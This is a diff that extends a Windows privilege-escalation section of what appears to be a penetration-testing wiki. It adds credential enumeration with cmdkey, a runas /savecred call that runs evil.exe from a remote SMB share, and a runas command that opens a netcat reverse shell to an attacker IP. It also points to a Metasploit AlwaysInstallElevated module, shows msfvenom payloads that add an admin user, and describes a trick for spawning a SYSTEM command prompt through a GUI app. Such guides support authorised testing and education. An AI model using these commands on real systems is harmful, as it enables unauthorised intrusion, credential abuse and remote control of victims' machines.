@@ -51,6 +51,8 @@ Look for possible **third party weird/vulnerable** drivers
 
 ```text
 driverquery
+driverquery.exe /fo table
+driverquery /SI
 ```
 
 ### Environment
@@ -535,9 +537,26 @@ Windows Vault stores credentials that Windows can log in the users automatically
 
 Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow **communicate with the credential manager and request the credentials for that resource** from the default storage vault.
 
+Use the `cmdkey` to list the stored credentials on the machine.
+
+```text
+cmdkey /list
+Currently stored credentials:
+ Target: Domain:interactive=WORKGROUP\Administrator
+ Type: Domain Password
+ User: WORKGROUP\Administrator
+```
+
+Then you can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.
+
 ```bash
-cmdkey /list #List credential
-runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
+runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+```
+
+Using `runas` with a provided set of credential.
+
+```bash
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
 
 Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
@@ -1028,6 +1047,8 @@ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o a
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
 ```
 
+If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
+
 ### PowerUP
 
 Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges:
@@ -1122,6 +1143,12 @@ A `pipe` is a block of shared memory that processes can use for communication an
 `Named Pipes` is a Windows mechanism that enables two unrelated processes to exchange data between themselves, even if the processes are located on two different networks. It's very similar to client/server architecture as notions such as `a named pipe server` and a named `pipe client` exist.
 
 When a **client writes on a pipe**, the **server** that created the pipe can **impersonate** the **client** if it has **SeImpersonate** privileges. Then, if you can find a **privileged process if going to write on any pipe that you can impersonate**, you could be able to **escalate privileges** impersonating that process after it writes inside your created pipe. [**You can read this to learn how to perform this attack**](named-pipe-client-impersonation.md)**.**
+
+### Insecure GUI apps
+
+Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
+
+Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt", click on "Click to open Command Prompt"
 
 ## From Administrator Medium to High Integrity Level / UAC Bypass
 
